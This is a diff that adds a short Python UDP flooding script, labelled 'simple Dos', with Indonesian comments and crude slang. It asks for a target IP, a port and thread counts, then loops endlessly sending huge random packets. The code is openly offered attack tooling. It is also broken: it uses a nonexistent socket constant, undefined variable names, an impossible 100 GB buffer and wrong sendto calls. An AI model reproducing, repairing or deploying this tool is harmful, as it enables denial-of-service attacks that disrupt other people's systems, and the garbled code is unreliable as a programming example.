@@ -1,0 +1,31 @@
+#simple Dos
+#Banu-Wibu
+import socket
+import random
+import threading
+import os,sys
+
+print("Banu-Attack")
+
+ip_wibu = str(input("Ip Target : "))
+port_wibu = int(input("Port Target : "))
+paket_wibu = int(input("Paket Dari Banu : "))
+threads_wibu = int(input("Thread Dari Banu : "))
+os.system("clear")
+
+def wibu():
+    asu = random._urandom(100000000000)#ubah angka urandom= damage
+    while True:
+        try:
+            s = socket.socket(socket.AF_INET , socket.SOCK_GRAM)
+            s.connect((ip_Memek,port_Kontol))
+            s.sendto(Kontol)
+            for x in range(Banu_Paket):
+                s.sendto(asu)
+            print("[•] Banu Ngirim Tai!!!")
+        except:
+            print("[•] Banu Lagi Ee!!!")
+
+for y in range(threads_Banu):
+    th = threading.Thread(target=Banu)
+    th.start()
